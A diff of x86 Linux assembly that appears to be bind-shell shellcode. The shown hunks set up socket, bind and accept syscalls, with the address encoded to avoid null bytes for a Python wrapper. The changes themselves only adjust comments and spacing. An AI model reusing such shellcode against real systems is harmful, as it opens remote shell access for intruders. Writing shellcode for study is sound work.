@@ -29,16 +29,16 @@ _start:
 	; Socket - 359
 	xor eax, eax
 	mov ax, 0x167		; Syscall 359 = Socket
-	mov bl, 2 		; $ebx = Domain = 2 [AF_INET]
+	mov bl, 2 			; $ebx = Domain = 2 [AF_INET]
 	xor ecx, ecx
-	mov cl, 1 		; $ecx = Type = 1 [SOCK_STREAM]
+	mov cl, 1 			; $ecx = Type = 1 [SOCK_STREAM]
 	xor edx, edx 		; $edx = Protocol = 0 [not set]
 	int 0x80 
 	
 	; Bind - 361
 	mov ebx, eax 			; $ebx = File descriptor stored in stack / returned by socket syscall
 	xor eax, eax
-	mov ax, 0x169 		; Syscall 361 = Bind
+	mov ax, 0x169 			; Syscall 361 = Bind
 	xor edi, edi 			; edi is 0
 	mov edi, 0x12111190 	; 0x12111190 = 0x100007F + 0x11111111
 	sub edi, 0x11111111 	; 0x11111111 is an aux value. It can change to 0x22222222, 0x33333333 with the Python wrapper if IP+0x11111111 has NOPs
@@ -55,7 +55,7 @@ _start:
 	int 0x80			; eax = 0 now
 
 	; Accept - 364
-	mov ax, 0x16c 		; Syscall 364 = Accept ; $ecx = addr = 0, local address ; $edx = Address length is 16 bits 
+	mov ax, 0x16c 		; Syscall 364 = Accept, $ecx = addr = 0, local address, $edx = Address length is 16 bits 
 	xor edx, edx
 	xor esi, esi
 	int 0x80
